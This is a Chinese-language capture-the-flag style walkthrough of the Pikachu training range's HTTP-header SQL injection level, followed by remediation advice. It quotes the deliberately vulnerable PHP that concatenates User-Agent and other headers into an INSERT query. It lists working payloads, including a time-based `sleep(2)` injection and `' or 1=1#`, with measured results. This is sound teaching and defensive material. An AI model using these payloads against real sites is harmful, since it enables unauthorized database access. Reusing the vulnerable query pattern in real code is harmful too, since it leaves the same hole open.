# "http header" 注入 通关笔记
> 前面的注入点都在"用户能看见的输入框"里。
>
> 这一关的注入点在 **HTTP 请求头**——`User-Agent`、`Referer`、`X-Forwarded-For` 这些。
>
> **它们在浏览器里看不见，但一样进了数据库。**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → "http header"注入 |
| 登录页 | `http://pikachu/vul/sqli/sqli_header/sqli_header_login.php` |
| 目标页 | `http://pikachu/vul/sqli/sqli_header/sqli_header.php` |
| 登录方式 | **POST** |
| 测试账号 | `admin` / `123456`（注意这里是 `users` 表，不是 `member`） |
| 目标 | 通过修改请求头注入 |
---
## 二、我的解题步骤
### 步骤 1：登录
打开登录页，输入 `admin` / `123456`。
> 注意：这里的账号是 `admin`，来自 `users` 表。用 `vince`（member 表）登不进去。
登录后页面显示：
```
你的ip地址:127.0.0.1
你的user agent:Mozilla/5.0 ...
你的http accept:text/html,...
你的端口（本次连接）:tcp12345
```
**这些信息被记录下来了。**
### 步骤 2：看源码，发现它存进了数据库
```php
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];
//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result=execute($link, $query);
```
**四个头信息，全部直接拼进 SQL，没有任何转义。**
### 步骤 3：改 User-Agent 试探
用 Burp 拦下请求，把 `User-Agent` 改成一个单引号：
```
User-Agent: '
```
放行。
**页面直接输出 SQL 报错：**
```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ...
```
**确认头信息存在注入。**
### 步骤 4：用时间盲注验证（不破坏数据）
把 User-Agent 改成：
```
',sleep(2),'1')#
```
我实测：
| User-Agent | 耗时 |
| --- | --- |
| `Mozilla/5.0`（正常） | 0.05 秒 |
| `',sleep(2),'1')#` | **2.03 秒** |
**延时生效 = 注入成立。**
代入后：
```sql
insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport)
values('1','127.0.0.1','',sleep(2),'1')#','text/html','12345')
```
`#` 注释掉了后面的部分，`sleep(2)` 被执行。
---
## 三、原理分析
### 3.1 源码
```php
$is_login_id=check_sqli_login($link);
if(!$is_login_id){
    header("location:sqli_header_login.php");
}
//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
```
### 3.2 可以注入的位置
| 头 | 对应变量 | 谁能控制 |
| --- | --- | --- |
| `User-Agent` | `HTTP_USER_AGENT` | **客户端随便改** |
| `Referer` | `HTTP_REFERER` | 客户端可以改 |
| `X-Forwarded-For` | `HTTP_X_FORWARDED_FOR` | 客户端可以改 |
| `Accept` | `HTTP_ACCEPT` | 客户端可以改 |
| `Cookie` | `HTTP_COOKIE` | 客户端可以改 |
| `Host` | `HTTP_HOST` | 客户端可以改 |
**凡是 `HTTP_` 开头的，都是客户端发过来的，都能伪造。**
### 3.3 为什么这些头会被存进数据库
常见业务场景：
| 场景 | 用到的头 |
| --- | --- |
| 记录访问日志 | IP、UA、Referer |
| 防刷 / 风控 | X-Forwarded-For |
| 统计来源 | Referer |
| 多端适配 | User-Agent |
**只要"记录日志"的代码写了拼接 SQL，就有注入。**
### 3.4 为什么这类注入特别隐蔽
| 原因 | 说明 |
| --- | --- |
| **不在页面上** | 用户看不到，测试时容易漏 |
| **扫描器未必覆盖** | 很多扫描器只测 GET/POST 参数 |
| **日志表往往没人看** | 注入进去了也不容易被发现 |
| **权限可能很高** | 日志写入常用高权限账号 |
---
## 四、知识点与笔记
### 4.1 HTTP 头注入的探测方法
| 步骤 | 操作 |
| --- | --- |
| 1 | 用 Burp 拦下请求 |
| 2 | 给某个头加一个 `'` |
| 3 | 看响应有没有 SQL 报错 |
| 4 | 有报错 → 用 `sleep()` 确认 |
**最常用的是 `User-Agent`，因为它最好改。**
### 4.2 常见 payload
```http
User-Agent: '
User-Agent: ',sleep(2),'1')#
User-Agent: ' or 1=1#
```
**注意**：不同的头对应的 `values()` 位置不同，闭合方式要调整。
### 4.3 为什么 X-Forwarded-For 特别危险
很多系统会"信任"这个头来判断真实 IP：
```php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?: $_SERVER['REMOTE_ADDR'];
```
但 `X-Forwarded-For` **完全由客户端控制**。
后果：
- 注入
- 伪造 IP 绕过限流
- 伪造 IP 绕过 IP 白名单
**只有前面的反向代理设置了，才可信；直接暴露的服务不能信。**
### 4.4 日志表的隐藏风险
日志表通常：
- 数据量大
- 写入频繁
- 用高权限账号
- **很少做输入校验**
**"记录日志"往往是最容易被忽略的注入点。**
---
## 五、和其他几关的区别
| 关卡 | 注入位置 | 谁能控制 |
| --- | --- | --- |
| 数字型 / 字符型 / 搜索型 | URL / 表单 | 用户 |
| **http header** | **请求头** | **用户（但看不见）** |
**同样的漏洞，藏在看不见的地方——所以更难被发现。**
---
## 六、防御怎么写
### 6.1 参数化（同样适用）
```php
$stmt = $link->prepare("insert into httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(?,?,?,?,?)");
$stmt->bind_param('issss', $is_login_id, $remoteipadd, $useragent, $httpaccept, $remoteport);
$stmt->execute();
```
### 6.2 校验 + 截断
```php
// 长度限制
$useragent = substr($useragent, 0, 255);
// 类型校验
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    $ip = '0.0.0.0';
}
```
### 6.3 日志写入用独立低权限账号
```sql
GRANT INSERT ON app_db.logs TO 'logger'@'localhost';
-- 只给 INSERT，不给 SELECT
```
**即使被注入，也只能插、不能读。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 请求头也是注入点 |
| 关键点 | UA / Referer / XFF 全都能伪造 |
| 探测 | 加 `'` 看报错 |
| 实测 | `UA='` 报 SQL 错误；`UA=',sleep(2),'1')#` 延时 2.03 秒 |
| 修复 | 参数化 + 长度/类型校验 |
**一句话**：
> **凡是客户端发过来的，都是不可信的——包括你看不见的那些头。**
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MDN: HTTP Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
